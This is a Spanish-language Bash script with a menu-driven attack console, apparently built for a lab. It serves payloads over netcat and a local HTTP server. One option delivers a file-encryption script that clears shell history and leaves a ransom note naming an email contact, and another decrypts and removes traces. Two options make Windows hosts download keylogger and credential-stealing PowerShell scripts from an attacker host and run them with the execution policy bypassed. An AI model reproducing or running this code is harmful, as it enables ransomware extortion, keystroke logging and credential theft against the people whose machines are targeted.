#!/bin/bash

while true; do
    clear
    echo "========================"
    echo "        MENÚ            "
    echo "========================"
    echo "1. Encriptar - Ubuntu"
    echo "2. Desencriptar - Ubuntu"
    echo "3. Keylogger - Windows"
    echo "4. Credentials - Windows"
    echo "5. Salir"
    echo "========================"
    read -p "Seleccione una opción [1-5]: " opcion

    case $opcion in
        1)
            # Obtener la dirección IP de la máquina
            var=$(hostname -I | awk '{print $1}')
            
            # Crear el script datos.sh
            cat <<EOF > encriptar.sh
wget http://$var:8000/py/encriptacion.py
python3 encriptacion.py
history -c
echo Para desencriptar escribe a enoc.girona@gmail.com >> leer.txt
exit
EOF
            # Ejecutar el servidor HTTP en segundo plano
            python3 -m http.server 8000 >/dev/null 2>&1 &
            # Esperar a que se inicie el servidor HTTP
            sleep 1
            # Enviar el script remoto a través de nc
            cat encriptar.sh | nc -4 -lvp 45000 -s $var
            ;;
        2)
        
            # Obtener la dirección IP de la máquina
            var=$(hostname -I | awk '{print $1}')
        
            # Crear el script desencriptar.sh
            cat <<EOF > desencriptar.sh
wget http://$var:8000/py/desencriptar.py
python3 desencriptar.py
history -c
rm -rf desencriptar.py
rm -rf key.zip
rm -rf leer.txt
rm -rf freebtc.sh
exit
EOF
            # Ejecutar el servidor HTTP en segundo plano
            python3 -m http.server 8000 >/dev/null 2>&1 &
            # Esperar a que se inicie el servidor HTTP
            sleep 1
            # Enviar el script desencriptar.sh a través de nc
            cat desencriptar.sh | nc -4 -lvp 45000 -s $var
            ;;
        3)
        
            # Obtener la dirección IP de la máquina
            var=$(hostname -I | awk '{print $1}')
        
            # Crear el script de comandos para el keylogger
            cat <<EOF > keylogger.sh      
powershell.exe Invoke-WebRequest -Uri "http://192.168.12.230:8000/exe/keylogger.txt" -OutFile "keylogger.txt"
powershell.exe -Command "Remove-Item -Path 'potato.ps1' -ErrorAction SilentlyContinue"
powershell.exe -Command "Rename-Item -Path 'keylogger.txt' -NewName 'potato.ps1'"
powershell.exe -ExecutionPolicy Bypass -File "C:\Users\Malware-User\Music\wintasks\netcat-1.11\potato.ps1"
EOF
            # Ejecutar el servidor HTTP en segundo plano
            python3 -m http.server 8000 >/dev/null 2>&1 &
            # Esperar a que el cliente se conecte y ejecutar el script en su terminal
            echo "Esperando conexión del cliente..."
            # Esperar a que el cliente se conecte y ejecutar el script en su terminal
            cat keylogger.sh | nc -4 -lvp 45000 -s $var
            ;;
        4)
        
            # Obtener la dirección IP de la máquina
            var=$(hostname -I | awk '{print $1}')
        
            # Crear el script de comandos para las credenciales
            cat <<EOF > credentials.sh      
powershell.exe Invoke-WebRequest -Uri "http://192.168.12.230:8000/exe/credentials.txt" -OutFile "credentials.txt"
powershell.exe -Command "Remove-Item -Path 'pass.ps1' -ErrorAction SilentlyContinue"
powershell.exe -Command "Rename-Item -Path 'credentials.txt' -NewName 'pass.ps1'"
powershell.exe -ExecutionPolicy Bypass -File "C:\Users\Malware-User\Music\wintasks\netcat-1.11\pass.ps1"
EOF
            # Ejecutar el servidor HTTP en segundo plano
            python3 -m http.server 8000 >/dev/null 2>&1 &
            # Esperar a que el cliente se conecte y ejecutar el script en su terminal
            echo "Esperando conexión del cliente..."
            # Esperar a que el cliente se conecte y ejecutar el script en su terminal
            cat credentials.sh | nc -4 -lvp 45000 -s $var
            ;;
        5)
            echo "Saliendo..."
            break
            ;;
        *)
            echo "Opción no válida. Intente de nuevo."
           
esac
    read -p "Presione enter para continuar..."
done
